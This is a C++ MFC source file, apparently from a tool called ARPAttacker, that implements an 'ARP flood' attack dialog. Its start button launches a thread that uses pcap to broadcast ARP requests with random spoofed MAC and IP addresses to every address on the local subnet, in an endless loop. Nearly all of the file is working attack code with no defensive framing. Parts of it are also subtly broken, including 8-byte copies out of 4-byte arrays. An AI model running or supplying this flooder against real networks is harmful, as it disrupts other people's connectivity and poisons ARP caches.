// ARPAttackerFloodDlg.cpp : implementation file
//

#include "stdafx.h"
#include "ARPAttacker.h"
#include "ARPAttackerFloodDlg.h"
#include "arpPacket.h"




string strSelDeviceNameFlood="";
BOOL bStartFlag;
BOOL bKillFlag;
int bInterval;
unsigned char* bLocalMacFlood;
unsigned long bLocalIpFlood;

UINT SendArpFloodPacket(LPVOID mainClass);

// CARPAttackerFloodDlg dialog

IMPLEMENT_DYNAMIC(CARPAttackerFloodDlg, CDialog)

CARPAttackerFloodDlg::CARPAttackerFloodDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CARPAttackerFloodDlg::IDD, pParent)
	, m_interval(0)
{
	

}

CARPAttackerFloodDlg::~CARPAttackerFloodDlg()
{
}

void CARPAttackerFloodDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_TIME, m_interval);
	DDV_MinMaxInt(pDX, m_interval, 1, 50000);
}


BEGIN_MESSAGE_MAP(CARPAttackerFloodDlg, CDialog)
	ON_BN_CLICKED(IDOK, &CARPAttackerFloodDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CARPAttackerFloodDlg message handlers



BOOL CARPAttackerFloodDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  Add extra initialization here
	m_interval=1000;
	GetDlgItem(IDC_STATIC_LOCALIP)->SetWindowTextA(IpToStr(m_localIp));
	bStartFlag=0;
	bKillFlag=0;
	UpdateData(FALSE);
	return TRUE;  // return TRUE unless you set the focus to a control
}

//开始、停止攻击按钮
void CARPAttackerFloodDlg::OnBnClickedOk()
{
	UpdateData(TRUE);
	if(bStartFlag==0){
		strSelDeviceNameFlood=m_SelDeviceName;
		bInterval=m_interval;
		bLocalIpFlood=m_localIp;
		bLocalMacFlood=m_localMac;
		GetDlgItem(IDCANCEL)->EnableWindow(FALSE);
		GetDlgItem(IDOK)->SetWindowTextA("停止攻击");
		GetDlgItem(IDC_STATIC_STATUS)->SetWindowTextA("状态:正在攻击");
		AfxBeginThread(SendArpFloodPacket, this);
		bStartFlag=1;
	}
	else{
		bKillFlag=1;
		bStartFlag=0;
		GetDlgItem(IDOK)->SetWindowTextA("开始攻击");
		GetDlgItem(IDC_STATIC_STATUS)->SetWindowTextA("状态:已停止");
		GetDlgItem(IDCANCEL)->EnableWindow(TRUE);
		//PostThreadMessage(m_nThreadID, WM_QUIT,0,0);
	}
}

UINT SendArpFloodPacket(LPVOID mainClass)
{
	const char* pDevName = strSelDeviceNameFlood.c_str();
	char errbuf[PCAP_ERRBUF_SIZE + 1]; 
	pcap_t* pAdaptHandle;
	if((pAdaptHandle = pcap_open_live(pDevName, 60, 0, 100, errbuf)) == NULL)
	{	
		MessageBox(NULL, "无法打开适配器，可能与之不兼容!", "wait", MB_OK);
		return -1;
	}
	//AfxMessageBox(strSelDeviceNameFlood.c_str());
	//构造并发送泛洪包
	int netNo=1;
	while(1){
		
		srand((unsigned) time(NULL));
		unsigned char* chIP;
		chIP = (unsigned char*)&bLocalIpFlood;
		chIP[3] = chIP[3] + rand() % 100;
		//unsigned long randIp = (unsigned long)*chIP;
		unsigned long long randIp;
		memcpy(&randIp,chIP,8);


		unsigned char aimIPa[4];
		aimIPa[0]=chIP[0];
		aimIPa[1]=chIP[1];
		aimIPa[2]=chIP[2];
		aimIPa[3] =netNo;
		//unsigned long randIp = (unsigned long)*chIP;
		unsigned long long aimIP;
		memcpy(&aimIP,aimIPa,8);
		
		unsigned char randMac[6];
		for(int i=0;i<6;i++){
			srand((unsigned) time(NULL) + i);
			randMac[i]=rand() % 256;
		}
		unsigned char broadcastMac[6];
		for(int i=0;i<6;i++){
			broadcastMac[i]=0xff;
		}

		unsigned char* arp_packet_for_rpl;
		arp_packet_for_rpl = BuildArpRequestPacket(broadcastMac,randMac, randIp,aimIP, 60);	
		pcap_sendpacket(pAdaptHandle, arp_packet_for_rpl, 60);
		Sleep(bInterval);
		netNo++;
		if(netNo==255)netNo=1;
		if(bKillFlag==1){
			break;
		}
	}
	bKillFlag=0;
	pcap_close(pAdaptHandle);
	
	
	return 0;
}

